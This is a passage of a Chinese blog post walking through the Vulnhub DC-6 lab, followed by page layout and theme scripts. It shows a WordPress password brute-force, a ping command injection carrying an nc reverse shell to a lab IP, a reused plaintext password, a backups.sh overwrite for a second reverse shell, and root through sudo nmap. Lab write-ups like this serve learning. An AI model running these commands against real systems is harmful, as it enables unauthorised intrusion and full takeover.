+<h4 id="wpscan爆破密码"><a class="markdownIt-Anchor" href="#wpscan爆破密码"></a> wpscan爆破密码</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy -U user.txt -P password.txt</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220010100105.png" alt="image-20260220010100105" /></p>
+<p>得到<code>Mark/helpdesk01</code></p>
+<p>登录后台</p>
+<p><img src="../images/image-20260220010150742.png" alt="image-20260220010150742" /></p>
+<h4 id="后台ping-rce漏洞"><a class="markdownIt-Anchor" href="#后台ping-rce漏洞"></a> 后台ping RCE漏洞</h4>
+<p>找到一个能ping命令执行的地方，命令拼接执行命令：<br />
+<img src="../images/image-20260220010438791.png" alt="image-20260220010438791" /></p>
+<h5 id="长度限制并绕过"><a class="markdownIt-Anchor" href="#长度限制并绕过"></a> 长度限制并绕过</h5>
+<p>前端进行了长度限制，但我们能修改前端代码或者抓包绕过</p>
+<h5 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h5>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;nc -e /bin/bash 192.168.139.141 9999</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220010740023.png" alt="image-20260220010740023" /></p>
+<p><img src="../images/image-20260220010750302.png" alt="image-20260220010750302" /></p>
+<h5 id="交互式shell"><a class="markdownIt-Anchor" href="#交互式shell"></a> 交互式shell</h5>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220010830997.png" alt="image-20260220010830997" /></p>
+<h2 id="后渗透"><a class="markdownIt-Anchor" href="#后渗透"></a> 后渗透</h2>
+<p>目前是www-data权限，需要提权</p>
+<h3 id="graham密码泄露"><a class="markdownIt-Anchor" href="#graham密码泄露"></a> graham密码泄露</h3>
+<p>先找suid：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure>
+<p>没发现可利用的，失败</p>
+<p>再找sudo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220011109606.png" alt="image-20260220011109606" /></p>
+<p>需要密码，失败</p>
+<p>在<code>/home/mark/stuff</code>下找到<code>thinks-to-do.txt</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br><span class="line">-----------------------------------(翻译)</span><br><span class="line">需要做的事情：</span><br><span class="line"></span><br><span class="line">恢复超光速驱动器的全部功能（需要与Jens沟通）</span><br><span class="line">为Sarah的欢送会购买礼物</span><br><span class="line">添加新用户：graham - GSo7isUM1D4 - 已完成</span><br><span class="line">申请OSCP课程</span><br><span class="line">为Sarah的接替者购买新笔记本电脑</span><br></pre></td></tr></table></figure>
+<p>是备忘录，发现<code>graham/GSo7isUM1D4</code>用户，su切换用户</p>
+<p><img src="../images/image-20260220011807316.png" alt="image-20260220011807316" /></p>
+<h3 id="切换jens用户jens权限执行任意命令"><a class="markdownIt-Anchor" href="#切换jens用户jens权限执行任意命令"></a> 切换jens用户(jens权限执行任意命令)</h3>
+<p>再次尝试<code>sudo -l</code></p>
+<p><img src="../images/image-20260220012113232.png" alt="image-20260220012113232" /></p>
+<p>发现了一个无密码用户<code>jens</code>，由于无密码是无法登录jens的，但是它说jens具有执行<code>backups.sh</code>的权利</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220012142436.png" alt="image-20260220012142436" /></p>
+<p>是对web的文件进行打包备份</p>
+<p>尝试执行一下这个脚本，权限不够，那是因为没有通过jens去执行这个脚本</p>
+<p><img src="../images/202405311948312.png" alt="image-20240531194802267" /></p>
+<p>通过使用sudo命令通过jens身份去执行这个脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220012454314.png" alt="image-20260220012454314" /></p>
+<p>执行成功</p>
+<p>那么我们具有jens身份执行的脚本，那如果我们将其中的命令修改为反弹shell的脚本，那我们就可以登录jens用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.139.141 8888&quot; &gt; backups.sh</span><br></pre></td></tr></table></figure>
+<p>然后以jens身份执行脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220012629980.png" alt="image-20260220012629980" /></p>
+<p>交互式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="sudo提权-nmap"><a class="markdownIt-Anchor" href="#sudo提权-nmap"></a> sudo提权-nmap</h3>
+<p>再再次<code>sudo -l</code></p>
+<p><img src="../images/image-20260220012849580.png" alt="image-20260220012849580" /></p>
+<p>可以以root权限执行nmap命令</p>
+<p>可以写入一条命令到getShell，并通过nmap运行getShell成功进入root用户，在/root目录下找到theflag.txt文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220013037480.png" alt="image-20260220013037480" /></p>
+<p>直接拿flag:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cat theflag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220013105957.png" alt="image-20260220013105957" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[代码审计]织梦CMS" class="lazyload">
+          
+        
+        <a href="/2026/02/20/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%E7%BB%87%E6%A2%A6CMS/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [代码审计]织梦CMS
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="0CTF2025" class="lazyload">
+        
+      
+      <a href="/2026/02/14/0CTF2025/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          0CTF2025
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E6%94%BEtcp80%E7%AB%AF%E5%8F%A3%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text"> 开放TCP80端口详细信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.</span> <span class="toc-text"> Web指纹识别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whatweb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.1.</span> <span class="toc-text"> Whatweb指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%B1%E6%B4%9E30%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 棱洞3.0指纹识别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wordpress"><span class="toc-number">2.4.</span> <span class="toc-text"> WordPress</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 漏洞扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 用户枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.4.3.</span> <span class="toc-text"> 目录与文件枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">2.4.4.</span> <span class="toc-text"> 制作密码字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wpscan%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-number">2.4.5.</span> <span class="toc-text"> wpscan爆破密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0ping-rce%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.6.</span> <span class="toc-text"> 后台ping RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%B9%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.6.1.</span> <span class="toc-text"> 长度限制并绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.4.6.2.</span> <span class="toc-text"> 反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-number">2.4.6.3.</span> <span class="toc-text"> 交互式shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#graham%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text"> graham密码泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2jens%E7%94%A8%E6%88%B7jens%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text"> 切换jens用户(jens权限执行任意命令)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83-nmap"><span class="toc-number">3.3.</span> <span class="toc-text"> sudo提权-nmap</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[Vulnhub靶机通关]DC-6",
+          url: "http://example.com/2026/02/19/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-6/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  前言 我觉得大靶机带给我最大的收获就是整理出一套属于自己的渗透思路，大部分卡住的点也都是信息收集没做到位，所以后面写靶机不会只写关键的点，而是全方位的信息枚举  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.141/24  定位192.168.139.136为我们的目标靶机 详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.136  开了80端口的web服务  开放TCP80端口详细信",
+          date: "Thu Feb 19 2026 21:47:37 GMT+0800",
+          updated: "Sun Feb 22 2026 00:27:01 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
